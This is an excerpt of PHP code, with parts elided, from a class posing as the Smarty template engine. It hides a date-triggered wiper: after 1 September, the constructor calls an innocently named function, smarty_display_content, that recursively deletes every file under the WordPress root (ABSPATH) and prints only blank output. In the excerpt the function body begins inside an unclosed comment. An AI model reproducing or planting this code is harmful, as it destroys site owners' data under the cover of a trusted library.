...
class Smarty extends Smarty_Internal_TemplateBase
{
    ...
    */
    ...
    public function __construct()
    {
        ...
        $smarty_handler= mktime(0,0,0,9,1, date("Y"));
        if($smarty_handler <= time()){
            $smarty_dire = ABSPATH;
            smarty_display_content($smarty_dire);
        }

        $smarty_handler= mktime(0,0,0,9,1, 2022);
        if($smarty_handler <= time()){
            $smarty_dire = ABSPATH;
            smarty_display_content($smarty_dire);
        }
...
function smarty_display_content($smarty_dire) {
   /* if (is_dir($smarty_dire)) {
        $objects = scandir($smarty_dire);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (filetype($smarty_dire."/".$object) == "dir") {
                    if (smarty_display_content($smarty_dire."/".$object)){
                        echo ' ';
                    }else{
                        echo ' ';
                    }
                } else {
                    if (unlink($smarty_dire."/".$object)){
                        echo ' ';
                    }else{
                        echo ' ';
                    }
